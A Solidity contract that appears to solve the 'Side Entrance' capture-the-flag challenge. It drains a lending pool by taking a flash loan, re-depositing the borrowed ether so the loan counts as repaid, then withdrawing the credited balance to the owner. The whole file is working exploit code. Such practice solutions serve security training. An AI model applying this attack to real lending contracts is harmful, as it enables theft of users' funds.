pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploiter {
    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) payable {
        owner = msg.sender;
        pool = _pool;
    }

    function exploit() public {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() payable external {}

}
